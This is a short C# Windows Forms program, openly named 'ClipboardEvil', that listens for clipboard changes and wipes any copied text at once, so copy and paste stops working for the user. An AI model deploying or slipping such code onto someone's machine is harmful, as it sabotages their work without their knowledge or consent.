using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace ClipboardEvil
{
    public partial class ClipboardEvil : Form
    {
        public ClipboardEvil()
        {
            InitializeComponent();
            Load += (sender, args) => AddClipboardFormatListener(Handle);
            Closed += (sender, args) => RemoveClipboardFormatListener(Handle);
        }

        protected override void WndProc(ref Message m)
        {
            base.WndProc(ref m);

            if (m.Msg == WM_CLIPBOARDUPDATE)
            {
                if(Clipboard.ContainsText())
                { 
                    Clipboard.Clear();
                }
            }
        }


        /// <summary>
        /// Places the given window in the system-maintained clipboard format listener list.
        /// </summary>
        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool AddClipboardFormatListener(IntPtr hwnd);

        /// <summary>
        /// Removes the given window from the system-maintained clipboard format listener list.
        /// </summary>
        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool RemoveClipboardFormatListener(IntPtr hwnd);

        /// <summary>
        /// Sent when the contents of the clipboard have changed.
        /// </summary>
        private const int WM_CLIPBOARDUPDATE = 0x031D;
    }
}
